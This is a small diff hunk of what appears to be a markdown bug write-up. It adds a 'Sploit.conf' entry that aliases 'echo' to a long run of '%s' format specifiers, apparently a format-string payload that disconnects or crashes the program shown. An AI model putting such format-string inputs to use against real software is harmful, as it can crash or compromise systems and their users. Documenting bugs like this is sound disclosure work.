@@ -73,6 +73,9 @@ pass 1
 echo
 [!] Disconnected from server
 mc02 75 $
+
+Sploit.conf: 
+alias echo echo %s%s%s%s%s%s%s%s%s%s%s%s%s%s
 ```
 
 ### Design bugs
